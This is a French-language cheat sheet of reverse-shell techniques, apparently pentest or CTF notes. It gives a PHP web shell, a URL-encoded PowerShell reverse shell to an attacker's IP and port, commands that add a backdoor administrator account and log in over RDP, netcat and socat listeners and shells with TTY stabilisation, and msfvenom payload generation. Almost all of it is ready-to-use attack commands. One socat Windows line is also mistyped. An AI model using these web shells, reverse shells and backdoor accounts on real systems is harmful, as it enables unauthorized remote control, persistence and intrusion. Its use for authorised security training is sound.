# Cheat Sheet Reverse Shell

# WebShell

**Linux**  
>- Copier puis modifier /usr/share/webshells/php/php-reverse-shell.php  
`$ip = '<IP ATTAQUANT>';`  
`$port = <PORT>;`  
>- Puis upload sur le site et accéder au fichier

**Windows**  
>- Créer un fichier php avec la ligne suivante :  
`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

>- Entrer l'URL du fichier avec l'argument "cmd" et la valeur:
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<**IP**>%27%2C<**PORT**>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

*Alors oui, c'est illisible parce que c'est encodé pour un URL mais c'est qu'il faut retenir c'est qu'il n'y a qu'à changer l'ip et le port (en gras) avant de charger l'URL*

>- On se log avec son listener préféré puis on se créer un utlisateur qu'on met dans le groupe admin  
`net user <utlisateur> <mdp> /add`  
`net localgroup administrators <utlisateur> /add`

>- Plus qu'à se log en RDP  
`sudo apt install freerdp2-x11`  
`xfreerdp /v:<IP CIBLE> /u:<utlisateur> /p:<mdp>`

# Netcat Reverse Shell
**Attaquant**  
`nc -lvnp <PORT>`

**Stabilisation**  
`python3 -c 'import pty;pty.spawn("/bin/bash")'` (ou python/python2/python3)  
`export TERM=xterm`  
`CTRL+Z`  
`stty raw -echo; fg`

# Socat Basic Reverse Shell  

**Attaquant**  
`socat TCP-L:<PORT> -` => Universel  
`socat TCP-L:<PORT> EXEC:"bash -li"` => Linux  
`socat TCP-L:<PORT> EXEC:powershell.exe,pipes` => Windows  

**Cible**  
`socat TCP:<IP ATTAQUANT>:<PORT> EXEC:"bash -li"` => Linux  
`socat TCP-L:<IP ATTAQUANT>:<PORT> EXEC:powershell.exe,pipes` => Windows  

*Pour une cible Windows, j'ai trouvé plus simple de mettre en place un bind shell plutôt qu'un reverse car powershell.exe n'est pas dans le path/variable d'envirionemment sous Linux*

# Socat Extended Reverse Shell
`socat TCP:<IP ATTAQUANT>:<PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`


# Merterpreter
`msfvenom --list payload`  
`msfvenom -p <PAYLOAD> -f <FORMAT> -o <OUTPUT> LHOST=<IP ATTAQUANT> LPORT=<PORT>`